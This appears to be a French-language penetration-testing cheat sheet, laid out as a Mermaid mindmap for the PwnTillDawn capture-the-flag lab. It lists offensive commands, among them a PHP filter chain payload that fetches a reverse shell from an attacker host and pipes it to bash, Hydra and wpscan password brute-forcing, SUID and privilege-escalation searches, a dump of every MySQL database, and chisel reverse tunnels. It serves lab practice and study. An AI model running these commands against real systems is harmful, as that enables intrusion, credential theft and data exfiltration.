```mermaid
mindmap
  root((Pwntilldawn FULL))
    Stegano
      Aperisolve
      Stereogram
        "https://piellardj.github.io/stereogram-solver/"
      Steghide
        "steghide extract -sf screen.jpeg"
      Depixelise
        Depix
          "python3 depix.py -p pixel_image -s images/searchimages/image.png"
        Unredactor
    WEB
      Wordpress
        "Enumération users"
          "wpscan --url url --enumerate u"
        "Check template et plugins vulnérables"
          "wpscan --url url --enumerate vp,vt"
        Bruteforce
          "wpscan --url url_wordpress --passwords wordlist"
        "wpscan --url https://www.hackinprovence.fr/ -e u"
      PHP Filters
        "\"python3 script.py --chain '<?= `wget attack_ip/revshell|bash`?>'\""
        "https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py"
      "Enumération"
        Path
          Dirsearch
          FeroxBuster
            "feroxbuster -u url -w ~/Desktop/SecLists-master/Discovery/Web-Content/common.txt --filter-status 404"
            "Sub title"
            "feroxbuster -u http://example.com -w wordlist -x php,html,txt -v -o output.txt --filter-status 404"
      "Bruteforce Forms"
        Hydra
          "hydra -l admin -P SecLists-master/rockyou.txt 10.150.150.38 -s 30609 -t 20 http-post-form \"/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password\""
    Privesc
      Metasploit
        "msfconsole"
        "multi/recon/local_exploit_suggester"
        "Upgrade session : sessions -u <id>"
      searchsploit
        "searchsploit xxxx"
        "searchsploit -m chemin"
      linpeas
        "sudo python3 -m http.server port (attaquant) et wget"
      SUID
        "find / -perm -u=s -type f 2>/dev/null"
      "Lien symbolique"
        "ln -s /root /home/michael/important_files/root_backup"
      LXC/LXD
        "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation"
      Windows
        Shell
          "Upgrade shell"
            "sessions -u id"
            "ps --> migrate pid"
        msfconsole
          "multi/recon/local_exploit_suggester"
    "Trouver un flag"
      Linux
        "find ./* | grep FLAG3"
        "find / -name FLAG6.txt 2>/dev/null"
        "find / -type f -name 'FLAG[0-9][0-9]' 2>/dev/null"
        "find / -type f -name 'FLAG[0-9].txt' 2>/dev/null"
      Windows
        "@for /r C:\\ %i in (FLAG??.txt) do @echo %i && @type \"%i\""
    Misc
      "Si besoin des erreurs mais pas affichée (ex webshell php)"
        "Ajout de \"2>fichier\" apres la commande"
        "puis faire un cat du fichier"
      "Dumb shell upgrade"
        "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
      "netstat -antup"
    "Protocoles divers"
      FTP
        "Login anon à vérif"
      NFS
        "showmount -e IP"
        "rpcinfo IP"
        "sudo mount -t nfs ip:/remote /local"
        "sudo umount 10.150.150.59:/nfsroot"
      SSH
        "Test de se co pour la bannière"
        "Connexion si on a la clé privée"
          "ssh -i id_rsa user@ip"
      DNS
        "! AXFR !"
          "dig @mortysserver.com mortysserver.com axfr"
        "Ajout dans /etc/hosts si besoin"
          "Exemple : 10.150.150.57 rickscontrolpanel.mortysserver.com"
      Mysql
        "mysql -h localhost -u sql_user -p"
        "mysqldump -u root -p --all-databases > alldb.sql"
    NMAP
      "nmap -sV -sC -T5 -p- ip"
      "sudo nmap -sF -p1-100 -T4"
    "Pivoting / Tunneling"
      "Verifier ce qui écoute sur localhost"
        "netstat -antup"
      "Tunneling & Port Forwarding"
        "Si on a un acces SSH"
          "sshuttle -r user@ip -N"
        "Web en écoute sur localhost"
          "Sur la victime"
            "./chisel client ip_host:7777 R:8080:127.0.0.1:8080"
              "Ne pas oublier d'adapter le port 8080 selon les situations"
          "Sur l'host"
            "chisel server -port 7777 --reverse"
```